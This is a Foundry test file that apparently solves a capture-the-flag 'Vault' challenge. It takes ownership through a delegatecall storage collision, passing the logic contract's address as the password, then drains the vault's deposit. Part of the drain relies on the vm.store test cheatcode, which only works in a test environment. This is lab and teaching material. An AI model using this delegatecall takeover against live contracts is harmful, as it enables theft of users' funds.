// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
    address palyer = address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
console.logAddress(address(logic));
        bytes memory payload = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            address(logic),
            palyer
        );
        (bool success, ) = address(vault).call(payload);
        require(success, "delegatecall failed");
        address owner = vault.owner();
        console.logAddress(owner);
        // 打开提现
        vault.openWithdraw();
        bytes32 slot = keccak256(abi.encode(palyer,uint256(2)));
        vm.store(address(vault), slot, bytes32(uint256(0.1 ether)));
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
